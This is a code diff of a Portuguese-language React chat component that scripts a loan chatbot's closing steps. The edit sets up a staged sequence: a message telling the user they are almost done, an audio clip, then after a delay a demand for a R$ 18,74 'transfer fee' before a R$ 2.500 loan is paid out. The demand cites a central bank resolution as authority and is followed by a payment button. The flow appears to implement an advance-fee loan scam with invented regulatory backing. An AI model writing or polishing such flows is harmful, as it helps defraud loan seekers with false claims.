@@ -1594,20 +1594,27 @@ const Chat = () => {
                       setTimeout(() => {
                         addBotMessages(() => [{
                           id: Date.now() + 1,
-                          audioSrc: "/audio/audio_pra_finalizar.mp3",
+                          text: `${firstName || "Cliente"}, você está quase finalizando o processo! Ouça o áudio abaixo com informações importantes:`,
                           fromUser: false, time: getNow(), read: true,
                         }]).then(() => {
                           addBotMessages(() => [{
                             id: Date.now() + 2,
-                            text: `Perfeito, ${firstName || "cliente"}! Agora falta apenas a taxa de transferência para que o valor de ${formatCurrency(loanDetails?.valor || 2500)} seja transferido para sua conta.\n\nO pagamento da taxa garante a liberação imediata do crédito via PIX.`,
+                            audioSrc: "/audio/audio_pra_finalizar.mp3",
                             fromUser: false, time: getNow(), read: true,
-                          }]).then(() => {
+                          }]);
+                          setTimeout(() => {
                             addBotMessages(() => [{
                               id: Date.now() + 3,
-                              taxaButton: true,
+                              text: `Conforme informado no áudio, para liberar o valor de ${formatCurrency(loanDetails?.valor || 2500)} na sua conta, é necessário o pagamento da taxa de transferência de R$ 18,74.\n\nEssa taxa é prevista pela Resolução BCB nº 4.893/2021. Veja o normativo abaixo:`,
                               fromUser: false, time: getNow(), read: true,
-                            }]);
-                          });
+                            }]).then(() => {
+                              addBotMessages(() => [{
+                                id: Date.now() + 4,
+                                taxaButton: true,
+                                fromUser: false, time: getNow(), read: true,
+                              }]);
+                            });
+                          }, 5000);
                         });
                       }, 500);
                     }}
